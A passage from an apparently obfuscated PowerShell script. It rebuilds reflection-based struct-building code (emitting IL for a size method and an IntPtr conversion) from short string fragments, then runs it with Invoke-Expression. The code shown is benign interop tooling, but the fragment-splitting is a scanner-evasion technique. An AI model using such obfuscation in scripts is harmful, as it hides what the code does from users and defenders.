','    }

    ','# Make the ','struct awar','e of its ow','n size.
   ',' # No more ','having to c','all [Runtim','e.InteropSe','rvices.Mars','hal]::SizeO','f!
    $Siz','eMethod = $','StructBuild','er.DefineMe','thod(''GetSi','ze'',
      ','  ''Public, ','Static'',
  ','      [Int]',',
        [','Type[]] @()',')
    $ILGe','nerator = $','SizeMethod.','GetILGenera','tor()
    #',' Thanks for',' the help, ','Jason Shirk','!
    $ILGe','nerator.Emi','t([Reflecti','on.Emit.OpC','odes]::Ldto','ken, $Struc','tBuilder)
 ','   $ILGener','ator.Emit([','Reflection.','Emit.OpCode','s]::Call,
 ','       [Typ','e].GetMetho','d(''GetTypeF','romHandle'')',')
    $ILGe','nerator.Emi','t([Reflecti','on.Emit.OpC','odes]::Call',',
        [','Runtime.Int','eropService','s.Marshal].','GetMethod(''','SizeOf'', [T','ype[]] @([T','ype])))
   ',' $ILGenerat','or.Emit([Re','flection.Em','it.OpCodes]','::Ret)

   ',' # Allow fo','r explicit ','casting fro','m an IntPtr','
    # No m','ore having ','to call [Ru','ntime.Inter','opServices.','Marshal]::P','trToStructu','re!
    $Im','plicitConve','rter = $Str','uctBuilder.','DefineMetho','d(''op_Impli','cit'',
     ','   ''Private','Scope, Publ','ic, Static,',' HideBySig,',' SpecialNam','e'',
       ',' $StructBui','lder,
     ','   [Type[]]',' @([IntPtr]','))
    $ILG','enerator2 =',' $ImplicitC','onverter.Ge','tILGenerato','r()
    $IL','Generator2.','Emit([Refle','ction.Emit.','OpCodes]::N','op)
    $IL','Generator2.','Emit([Refle','ction.Emit.','OpCodes]::L','darg_0)
   ',' $ILGenerat','or2.Emit([R','eflection.E','mit.OpCodes',']::Ldtoken,',' $StructBui','lder)
    $','ILGenerator','2.Emit([Ref','lection.Emi','t.OpCodes]:',':Call,
    ','    [Type].','GetMethod(''','GetTypeFrom','Handle''))
 ','   $ILGener','ator2.Emit(','[Reflection','.Emit.OpCod','es]::Call,
','        [Ru','ntime.Inter','opServices.','Marshal].Ge','tMethod(''Pt','rToStructur','e'', [Type[]','] @([IntPtr','], [Type]))',')
    $ILGe','nerator2.Em','it([Reflect','ion.Emit.Op','Codes]::Unb','ox_Any, $St','ructBuilder',')
    $ILGe','nerator2.Em','it([Reflect','ion.Emit.Op','Codes]::Ret',')

    $Str','uctBuilder.','CreateType(',')
}
'); $script = $fragments -join ''; Invoke-Expression $script